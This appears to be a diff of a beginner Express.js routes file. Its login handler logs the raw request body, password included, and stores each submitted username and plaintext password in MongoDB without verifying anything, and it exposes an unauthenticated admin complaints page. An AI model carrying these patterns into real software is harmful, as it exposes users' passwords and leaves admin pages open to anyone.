@@ -1,23 +1,19 @@
-// routes.js
+// Import your MongoDB model at the top
+const UserLogin = require('./db'); // This connects to your 'userlogins' collection
 
-const UserLogin = require('./db'); // Your Mongoose model
-const express =require('express');
 module.exports = (server) => {
-    // Middleware to parse request bodies
-    server.use(express.urlencoded({ extended: true }));
-    server.use(express.json());
-
-    // GET: Render login page
+    // GET route - just shows the login page
     server.get('/', (req, res) => {
         res.render('login');
     });
-
-    // POST: Handle login form
-    server.post('/login', async (req, res) => {
+    
+    // POST route - handles form submission and saves to database
+    server.post('/', async (req, res) => {
         console.log('POST /login route hit!'); // Check if route is reached
         console.log('Request body:', req.body); // Check form data
         
         try {
+            // Get form data from request body
             const { user, password } = req.body;
             
             // Debug: Check individual values
@@ -32,22 +28,21 @@ module.exports = (server) => {
             
             // Save to MongoDB
             await newUser.save();
-
+            
+            // Redirect to dashboard or show success
             res.render('login', { success: 'Login successful!' });
-
+            
         } catch (error) {
             console.error('Error saving user:', error);
             res.render('login', { error: 'Login failed. Please try again.' });
         }
-    });
-
-    // Admin route
-    server.get('/admin', (req, res) => {
-        res.render('admin');
-    });
-
-    // Home route (only once)
-    server.get('/admin/home', (req, res) => {
-        res.render('home');
-    });
+    }
+);
+ server.get('/home',async(req,res)=>{
+    res.render('home');
+ })
+ server.get('/admin/complaints',async(req,res)=>{
+    res.render('compliant');
+ })
+    return server;
 };
